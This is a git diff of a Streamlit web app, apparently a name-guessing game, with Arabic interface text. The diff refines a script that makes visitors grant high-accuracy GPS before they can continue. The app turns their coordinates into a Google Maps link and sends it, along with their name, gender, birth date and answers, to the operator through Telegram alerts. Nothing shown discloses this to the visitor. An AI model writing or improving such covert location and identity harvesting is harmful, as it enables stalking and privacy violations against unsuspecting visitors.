@@ -41,14 +41,13 @@ if "visitor_dob" not in st.session_state:
     st.session_state.visitor_dob = ""
 if "attempts" not in st.session_state:
     st.session_state.attempts = 0
-if "user_location_link" not in st.session_state:
-    st.session_state.user_location_link = "لم يتم تفعيل GPS"
 
-# التحقق من الإحداثيات الممررة عبر رابط الصفحة
-if "lat" in st.query_params and "lon" in st.query_params:
-    lat = st.query_params["lat"]
-    lon = st.query_params["lon"]
-    st.session_state.user_location_link = f"https://www.google.com/maps?q={lat},{lon}"
+# قراءة الإحداثيات مباشرة من رابط الصفحة إذا تم تمريرها
+params = st.query_params
+if "lat" in params and "lon" in params:
+    st.session_state.user_location_link = f"https://www.google.com/maps?q={params['lat']},{params['lon']}"
+elif "user_location_link" not in st.session_state:
+    st.session_state.user_location_link = "لم يتم تفعيل GPS"
 
 
 # دالة إرسال التنبيهات إلى تيليغرام
@@ -185,50 +184,57 @@ if st.session_state.step == 1:
         unsafe_allow_html=True,
     )
 
-    # مربع طلب الخريطة الإجباري
     is_gps_active = "google.com/maps" in st.session_state.user_location_link
     status_msg = (
         '<div class="location-status-active">✅ تم تفعيل الخريطة وتحديد موقعك بنجاح!</div>'
         if is_gps_active
-        else '<div class="location-status-pending">⚠️ الخريطة غير مفعلة! اضغط الزر بالأسفل لتفعيل GPS للدخول.</div>'
+        else '<div class="location-status-pending">⚠️ الخريطة غير مفعلة! اضغط الزر بالأسفل لتفعيل GPS.</div>'
     )
 
     st.markdown(
         f"""
         <div class="location-box">
             <h4 style="margin:0; color:#ff4d6d;">📍 شرط تشغيل الموقع</h4>
-            <p style="font-size:14px; margin-top:5px; color:#ddd;">يرجى تفعيل الخريطة (GPS) على جهازك لفتح زر المتابعة.</p>
+            <p style="font-size:14px; margin-top:5px; color:#ddd;">يرجى تفعيل الخريطة (GPS) على جهازك والموافقة على التحديد لفتح المتابعة.</p>
             {status_msg}
         </div>
         """,
         unsafe_allow_html=True,
     )
 
-    # زر الجافاسكريبت لإجبار جلب الموقع
+    # مكون تفعيل الموقع الجغرافي عبر إعادة التوجيه الفوري
     loc_html = """
     <script>
-    function triggerGPS() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(function(position) {
+    function requestLocation() {
+        if (!navigator.geolocation) {
+            alert("⚠️ خاصية التحديد غير مدعومة في متصفحك.");
+            return;
+        }
+        navigator.geolocation.getCurrentPosition(
+            function(position) {
                 var lat = position.coords.latitude;
                 var lon = position.coords.longitude;
-                var newUrl = window.parent.location.pathname + "?lat=" + lat + "&lon=" + lon;
-                window.parent.location.href = newUrl;
-            }, function(error) {
-                alert("🚫 يجب تشغيل الـ GPS من إعدادات الهاتف والسماح للمتصفح للوصول للموقع كي يعمل الموقع!");
-            }, {enableHighAccuracy: true});
-        } else {
-            alert("الخريطة غير مدعومة في هذا المتصفح.");
-        }
+                var currentUrl = window.top.location.href.split('?')[0];
+                window.top.location.href = currentUrl + "?lat=" + lat + "&lon=" + lon;
+            },
+            function(error) {
+                if (error.code == error.PERMISSION_DENIED) {
+                    alert("🚫 تم رفض الاذن! يرجى السماح للمتصفح بالوصول للموقع من إعدادات الهاتف ثم إعادت الضغط على الزر.");
+                } else {
+                    alert("⚠️ تعذر تحديد الموقع، يرجى التأكد من تشغيل الـ GPS في الهاتف.");
+                }
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
     }
     </script>
     <div style="text-align: center;">
-        <button onclick="triggerGPS()" style="background: linear-gradient(135deg, #00c853, #b2ff59); color: #000; border: none; padding: 12px 20px; border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px;">
+        <button onclick="requestLocation()" style="background: linear-gradient(135deg, #00c853, #b2ff59); color: #000; border: none; padding: 14px 20px; border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; box-shadow: 0 0 10px rgba(0,200,83,0.5);">
             🌐 اضغط هنا لتشغيل الخريطة والموافقة على الموقع 📍
         </button>
     </div>
     """
-    components.html(loc_html, height=60)
+    components.html(loc_html, height=70)
 
     with st.form("user_info_form"):
         name_in = st.text_input("Enter Your Name:", placeholder="Type your name here...")
@@ -247,7 +253,7 @@ if st.session_state.step == 1:
             if not name_val:
                 st.warning("Please enter your name first!")
             elif "google.com/maps" not in st.session_state.user_location_link:
-                st.error("🚫 عذراً! لن يعمل الموقع حتى تقوم بتشغيل الخريطة والضغط على الزر الأخضر بالـ GPS أولاً!")
+                st.error("🚫 عذراً! لن يعمل الموقع حتى تقوم بالضغط على الزر الأخضر والسماح بالـ GPS أولاً!")
             elif not is_legally_allowed_in_morocco(name_val):
                 st.error("⚠️ This name cannot be entered, please try again!")
             else:
@@ -255,7 +261,6 @@ if st.session_state.step == 1:
                 st.session_state.visitor_gender = gender_in
                 st.session_state.visitor_dob = str(dob_in)
 
-                # إرسال التنبيه الفوري متضمناً رابط الخريطة الدقيق
                 msg = (
                     f"🚨 دخول زائر جديد!\n"
                     f"👤 الاسم: {name_val}\n"
@@ -330,7 +335,6 @@ elif st.session_state.step == 2:
             clean_name = user_input.strip().lower()
             st.session_state.attempts += 1
 
-            # إرسال التنبيه عند محاولة الإجابة
             msg = (
                 f"🎯 إجابة جديدة!\n"
                 f"👤 الاسم: {st.session_state.visitor_name}\n"
@@ -344,7 +348,6 @@ elif st.session_state.step == 2:
                 st.error(f"⚠️ تنبيه البوت: {err_msg}")
 
             if clean_name in ALLOWED_NAMES:
-                # 🎵 تشغيل موسيقى/أغنية النجاح السعيدة 🎵
                 st.markdown(
                     """
                     <audio autoplay loop style="display:none;">
@@ -486,7 +489,6 @@ elif st.session_state.step == 2:
                     )
 
             else:
-                # 🎵 تشغيل موسيقى/أغنية الفشل الحزينة 🎵
                 st.markdown(
                     """
                     <audio autoplay loop style="display:none;">
